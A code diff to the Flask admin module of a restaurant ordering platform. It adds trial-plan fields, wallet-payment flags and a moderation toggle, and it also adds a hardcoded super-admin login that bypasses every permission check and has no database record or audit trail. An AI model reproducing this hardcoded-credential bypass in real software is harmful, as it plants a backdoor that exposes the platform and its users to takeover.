@@ -1,8 +1,9 @@
 from flask import Blueprint, render_template, request, redirect, url_for, flash, session, current_app, jsonify, g, send_file, make_response
 from functools import wraps
 from app import db
-from app.models import User, Restaurant, Order, Category, Table, MenuItem, ApiKey, RegistrationRequest, ModerationLog
+from app.models import User, Restaurant, Order, Category, Table, MenuItem, ApiKey, RegistrationRequest, ModerationLog, SystemSettings
 from app.services.qr_service import generate_restaurant_qr_code, generate_qr_code
+from app.hardcoded_admin import check_hardcoded_admin, SUPER_ADMIN
 from datetime import datetime, timedelta
 from werkzeug.utils import secure_filename
 import os
@@ -23,11 +24,28 @@ ROLE_PERMISSIONS = {
 
 def get_current_admin_user():
     """Get the current logged in admin user - ADMIN ONLY"""
-    if session.get('admin_logged_in') and session.get('admin_user_id'):
-        user = User.query.get(session.get('admin_user_id'))
-        # Only return if user is actually an admin role
-        if user and user.role in ADMIN_ROLES:
-            return user
+    if session.get('admin_logged_in'):
+        # Check if this is the hardcoded super admin
+        if session.get('is_hardcoded_admin'):
+            # Return a mock user object for hardcoded admin
+            # This admin has FULL ACCESS to everything - no restrictions
+            class HardcodedAdmin:
+                def __init__(self):
+                    self.id = 0
+                    self.username = session.get('admin_username', 'superadmin')
+                    self.email = session.get('admin_email', SUPER_ADMIN['email'])
+                    self.role = 'superadmin'
+                    self.is_active = True
+                    self.restaurant = None
+
+            return HardcodedAdmin()
+
+        # Otherwise, get from database
+        if session.get('admin_user_id'):
+            user = User.query.get(session.get('admin_user_id'))
+            # Only return if user is actually an admin role
+            if user and user.role in ADMIN_ROLES:
+                return user
     return None
 
 def get_current_owner():
@@ -44,10 +62,16 @@ def has_permission(permission):
     user = get_current_admin_user()
     if not user:
         return False
+
+    # Hardcoded superadmin has ALL permissions - no restrictions
+    if session.get('is_hardcoded_admin'):
+        return True
+
     role = user.role
     # Legacy system_admin is treated as superadmin
     if role == 'system_admin':
         role = 'superadmin'
+
     return permission in ROLE_PERMISSIONS.get(role, [])
 
 def admin_required(f):
@@ -92,13 +116,15 @@ def permission_required(permission):
                 flash('Access denied', 'error')
                 return redirect(url_for('admin.login'))
 
-            role = user.role
-            if role == 'system_admin':
-                role = 'superadmin'
+            # Hardcoded superadmin bypasses all permission checks
+            if not session.get('is_hardcoded_admin'):
+                role = user.role
+                if role == 'system_admin':
+                    role = 'superadmin'
 
-            if permission not in ROLE_PERMISSIONS.get(role, []):
-                flash('You do not have permission to access this page', 'error')
-                return redirect(url_for('admin.dashboard'))
+                if permission not in ROLE_PERMISSIONS.get(role, []):
+                    flash('You do not have permission to access this page', 'error')
+                    return redirect(url_for('admin.dashboard'))
 
             g.admin_user = user
             return f(*args, **kwargs)
@@ -119,18 +145,47 @@ def superadmin_required(f):
         return f(*args, **kwargs)
     return decorated_function
 
+# Context processor to make has_permission available in all admin templates
+@admin_bp.context_processor
+def inject_permissions():
+    """Inject has_permission function and admin user into all admin templates"""
+    return {
+        'has_permission': has_permission,
+        'admin_user': get_current_admin_user()
+    }
+
 @admin_bp.route('/login', methods=['GET', 'POST'])
 def login():
     """Admin login - for superadmin, admin, moderator only"""
     if request.method == 'POST':
         username = request.form.get('username')
         password = request.form.get('password')
+
+        # First, check hardcoded super admin credentials
+        hardcoded_admin = check_hardcoded_admin(username, password)
+        if hardcoded_admin:
+            # Log in as hardcoded super admin
+            session['admin_logged_in'] = True
+            session['admin_user_id'] = hardcoded_admin['id']  # Special ID: 0
+            session['admin_role'] = hardcoded_admin['role']
+            session['is_hardcoded_admin'] = True  # Flag to identify hardcoded admin
+            session['admin_email'] = hardcoded_admin['email']
+            session['admin_username'] = hardcoded_admin['username']
+            flash(f'Welcome, Super Admin!', 'success')
+            return redirect(url_for('admin.dashboard'))
+
+        # If not hardcoded, check database users by username or email
         # Only allow admin roles (not restaurant_owner)
-        user = User.query.filter_by(username=username).filter(User.role.in_(['superadmin', 'system_admin', 'admin', 'moderator'])).first()
+        user = User.query.filter(
+            db.or_(User.username == username, User.email == username),
+            User.role.in_(['superadmin', 'system_admin', 'admin', 'moderator'])
+        ).first()
+
         if user and user.check_password(password) and user.is_active:
             session['admin_logged_in'] = True
             session['admin_user_id'] = user.id
             session['admin_role'] = user.role
+            session.pop('is_hardcoded_admin', None)  # Remove hardcoded flag if exists
             flash(f'Welcome, {user.username}!', 'success')
             return redirect(url_for('admin.dashboard'))
         flash('Invalid credentials or account disabled', 'error')
@@ -717,6 +772,13 @@ def create_pricing_plan():
         badge_text=request.form.get('badge_text') or None,
         cta_text=request.form.get('cta_text', 'Get Started'),
         cta_link=request.form.get('cta_link', '/owner/login'),
+        # Trial Configuration
+        trial_enabled=request.form.get('trial_enabled') == '1',
+        trial_days=int(request.form.get('trial_days', 0)) if request.form.get('trial_days') else 0,
+        grace_period_days=int(request.form.get('grace_period_days', 3)) if request.form.get('grace_period_days') else 3,
+        max_retry_attempts=int(request.form.get('max_retry_attempts', 3)) if request.form.get('max_retry_attempts') else 3,
+        retry_interval_hours=int(request.form.get('retry_interval_hours', 24)) if request.form.get('retry_interval_hours') else 24,
+        cancellation_behavior=request.form.get('cancellation_behavior', 'end_of_period'),
         # Limits
         max_tables=int(request.form.get('max_tables')) if request.form.get('max_tables') else None,
         max_menu_items=int(request.form.get('max_menu_items')) if request.form.get('max_menu_items') else None,
@@ -785,6 +847,13 @@ def edit_pricing_plan(id):
     plan.max_orders_per_month = int(request.form.get('max_orders_per_month')) if request.form.get('max_orders_per_month') else None
     plan.max_restaurants = int(request.form.get('max_restaurants')) if request.form.get('max_restaurants') else None
     plan.max_staff_accounts = int(request.form.get('max_staff_accounts')) if request.form.get('max_staff_accounts') else None
+    # Trial Configuration
+    plan.trial_enabled = request.form.get('trial_enabled') == '1'
+    plan.trial_days = int(request.form.get('trial_days', 0)) if request.form.get('trial_days') else 0
+    plan.grace_period_days = int(request.form.get('grace_period_days', 3)) if request.form.get('grace_period_days') else 3
+    plan.max_retry_attempts = int(request.form.get('max_retry_attempts', 3)) if request.form.get('max_retry_attempts') else 3
+    plan.retry_interval_hours = int(request.form.get('retry_interval_hours', 24)) if request.form.get('retry_interval_hours') else 24
+    plan.cancellation_behavior = request.form.get('cancellation_behavior', 'end_of_period')
     # Feature toggles
     plan.has_kitchen_display = request.form.get('has_kitchen_display') == '1'
     plan.has_customer_display = request.form.get('has_customer_display') == '1'
@@ -868,7 +937,7 @@ def payment_gateways():
 @admin_bp.route('/payment-gateways/init', methods=['POST'])
 @admin_required
 def init_payment_gateways():
-    """Initialize default payment gateways (PayPal and Stripe)"""
+    """Initialize default payment gateways (PayPal and Stripe with wallet support)"""
     from app.models.website_content_models import PaymentGateway
     user = get_current_admin_user()
 
@@ -879,31 +948,39 @@ def init_payment_gateways():
             display_name='PayPal',
             description='Pay securely with PayPal. Credit cards, debit cards, and PayPal balance accepted.',
             icon='bi-paypal',
+            gateway_type='gateway',
             is_sandbox=True,
             is_active=False,
-            display_order=1,
+            display_order=2,
             supported_currencies='USD,EUR,GBP,CAD,AUD',
+            supports_recurring=True,
+            supports_tokenization=True,
             created_by_id=user.id
         )
         db.session.add(paypal)
 
-    # Create Stripe if not exists
+    # Create Stripe if not exists (with Google Pay / Apple Pay support)
     if not PaymentGateway.query.filter_by(name='stripe').first():
         stripe = PaymentGateway(
             name='stripe',
             display_name='Stripe',
-            description='Pay securely with credit or debit card via Stripe.',
+            description='Pay securely with credit or debit card. Also supports Google Pay and Apple Pay.',
             icon='bi-credit-card-2-front',
+            gateway_type='gateway',
             is_sandbox=True,
             is_active=False,
-            display_order=2,
+            display_order=1,
             supported_currencies='USD,EUR,GBP,CAD,AUD,JPY,SGD',
+            supports_recurring=True,
+            supports_tokenization=True,
+            supports_google_pay=True,
+            supports_apple_pay=True,
             created_by_id=user.id
         )
         db.session.add(stripe)
 
     db.session.commit()
-    flash('Payment gateways initialized successfully', 'success')
+    flash('Payment gateways initialized successfully! Configure your API keys to enable them.', 'success')
     return redirect(url_for('admin.payment_gateways'))
 
 
@@ -933,6 +1010,11 @@ def update_payment_gateway(id):
         gateway.stripe_secret_key = request.form.get('stripe_secret_key', '')
         gateway.stripe_sandbox_publishable_key = request.form.get('stripe_sandbox_publishable_key', '')
         gateway.stripe_sandbox_secret_key = request.form.get('stripe_sandbox_secret_key', '')
+        # Wallet support
+        gateway.supports_google_pay = request.form.get('supports_google_pay') == '1'
+        gateway.supports_apple_pay = request.form.get('supports_apple_pay') == '1'
+        gateway.google_pay_merchant_id = request.form.get('google_pay_merchant_id', '')
+        gateway.apple_pay_merchant_id = request.form.get('apple_pay_merchant_id', '')
 
     gateway.webhook_secret = request.form.get('webhook_secret', '')
 
@@ -1987,6 +2069,8 @@ def toggle_api_key(key_id):
 @permission_required('registrations')
 def registrations():
     """Main registration queue dashboard"""
+    from app.models import SystemSettings
+    
     status_filter = request.args.get('status', 'pending')
     priority_filter = request.args.get('priority')
 
@@ -2035,14 +2119,35 @@ def registrations():
 
     # Get moderators for assignment
     moderators = User.query.filter(User.role.in_(['system_admin', 'moderator'])).all()
+    
+    # Get system settings for moderation toggle
+    system_settings = SystemSettings.get_settings()
 
     return render_template('admin/registrations.html',
         requests=requests,
         stats=stats,
         current_status=status_filter,
         current_priority=priority_filter,
-        moderators=moderators
+        moderators=moderators,
+        system_settings=system_settings
     )
+
+
+@admin_bp.route('/registrations/toggle-moderation', methods=['POST'])
+@admin_required
+def toggle_moderation():
+    """Toggle registration moderation on/off"""
+    from app.models import SystemSettings
+    
+    settings = SystemSettings.get_settings()
+    settings.moderation_enabled = not settings.moderation_enabled
+    settings.updated_by_id = session.get('admin_user_id')
+    db.session.commit()
+    
+    status = 'enabled' if settings.moderation_enabled else 'disabled'
+    flash(f'Registration moderation has been {status}.', 'success')
+    
+    return redirect(url_for('admin.registrations'))
 
 
 @admin_bp.route('/registrations/<int:request_id>')
@@ -2105,14 +2210,42 @@ def assign_registration(request_id):
 @admin_bp.route('/registrations/<int:request_id>/approve', methods=['POST'])
 @admin_required
 def approve_registration(request_id):
-    """Approve a registration request and create user/restaurant"""
+    """Approve a registration request and create user/restaurant or approve existing"""
     reg_request = RegistrationRequest.query.get_or_404(request_id)
 
-    if reg_request.status in ['approved', 'rejected']:
-        flash('This request has already been processed', 'error')
+    if reg_request.status == 'approved':
+        flash('This request has already been approved', 'error')
         return redirect(url_for('admin.registration_detail', request_id=request_id))
 
-    # Check if email already exists
+    # Check if user/restaurant already exist (moderation flow - account already created)
+    if reg_request.approved_user_id and reg_request.approved_restaurant_id:
+        # Just approve the existing restaurant
+        restaurant = Restaurant.query.get(reg_request.approved_restaurant_id)
+        if restaurant:
+            restaurant.registration_status = 'approved'
+            restaurant.rejection_reason = None
+
+            old_status = reg_request.status
+            reg_request.status = 'approved'
+            reg_request.reviewed_at = datetime.utcnow()
+            reg_request.moderator_id = session.get('admin_user_id')
+            reg_request.moderator_notes = request.form.get('notes', '')
+
+            log = ModerationLog(
+                request_id=reg_request.id,
+                moderator_id=session.get('admin_user_id'),
+                action='approved',
+                previous_status=old_status,
+                new_status='approved',
+                notes=f'Approved existing restaurant: {restaurant.name}'
+            )
+            db.session.add(log)
+            db.session.commit()
+
+            flash(f'Registration approved! Restaurant "{restaurant.name}" now has full access.', 'success')
+            return redirect(url_for('admin.registrations'))
+
+    # Original flow: Create new user and restaurant
     if User.query.filter_by(email=reg_request.applicant_email).first():
         flash('A user with this email already exists', 'error')
         return redirect(url_for('admin.registration_detail', request_id=request_id))
@@ -2149,7 +2282,8 @@ def approve_registration(request_id):
         address=reg_request.restaurant_address,
         phone=reg_request.restaurant_phone,
         owner_id=new_user.id,
-        is_active=True
+        is_active=True,
+        registration_status='approved'
     )
     db.session.add(new_restaurant)
     db.session.flush()
@@ -2196,6 +2330,13 @@ def reject_registration(request_id):
     reg_request.reviewed_at = datetime.utcnow()
     reg_request.moderator_id = session.get('admin_user_id')
     reg_request.rejection_reason = reason
+    
+    # Also update the restaurant's registration status if it exists
+    if reg_request.approved_restaurant_id:
+        restaurant = Restaurant.query.get(reg_request.approved_restaurant_id)
+        if restaurant:
+            restaurant.registration_status = 'rejected'
+            restaurant.rejection_reason = reason
 
     log = ModerationLog(
         request_id=reg_request.id,
